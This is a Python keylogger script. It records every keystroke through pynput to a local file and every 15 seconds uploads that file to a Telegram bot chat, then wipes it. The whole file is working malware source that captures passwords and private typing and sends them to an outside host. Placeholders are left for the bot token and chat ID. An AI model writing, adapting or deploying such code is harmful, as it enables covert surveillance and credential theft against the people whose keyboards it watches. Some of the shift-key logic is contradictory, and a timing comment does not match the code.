import pynput.keyboard as keyboard # type: ignore
import os
import requests # type: ignore
import time

# Specify the file to store keystrokes
log_file = "key_log.txt"

# Telegram Bot API token and chat ID
TELEGRAM_BOT_TOKEN = 'your_telegram_bot_token_here' # Enter your telegram BOT token
CHAT_ID = 'your_chat_id_here' # Enter your Chat ID

# Function to log each keypress with case sensitivity
def log_keystroke(key):
    with open(log_file, 'a') as f:
        try:
            if key.char:
                # Write the character to the file
                f.write(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            elif key == keyboard.Key.shift:
                # Handle shift key to log next character as uppercase
                global shift_active
                shift_active = True
            elif key == keyboard.Key.shift_r or key == keyboard.Key.shift_l:
                shift_active = True
            elif key == keyboard.Key.shift_r:
                shift_active = False
            elif key == keyboard.Key.shift_l:
                shift_active = False
            else:
                # Log other special keys
                f.write(f'[{str(key)}]')

# Initialize shift key status
shift_active = False

# Function to send log file to Telegram
def send_log_to_telegram():
    # Check if the log file exists and is not empty
    if os.path.exists(log_file) and os.path.getsize(log_file) > 0:
        with open(log_file, 'rb') as f:
            response = requests.post(
                f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument',
                data={'chat_id': CHAT_ID, 'caption': 'Keylogger Log File'},
                files={'document': f}
            )
        if response.status_code == 200:
            print("Log file sent successfully!")
            # Clear the log file after successful sending
            with open(log_file, 'w') as f:
                f.truncate(0)
        else:
            print(f"Failed to send log file. Status code: {response.status_code}")
    else:
        print("Log file is empty. Skipping send.")

# Start the keylogger
def start_keylogger():
    with keyboard.Listener(on_press=log_keystroke) as listener:
        listener.join()

if __name__ == "__main__":
    # Start the keylogger in a background thread
    import threading
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()

    # Continuously send the log file to Telegram every 60 seconds (or any desired interval)
    while True:
        time.sleep(15)  # Send the log every 60 seconds
        send_log_to_telegram()
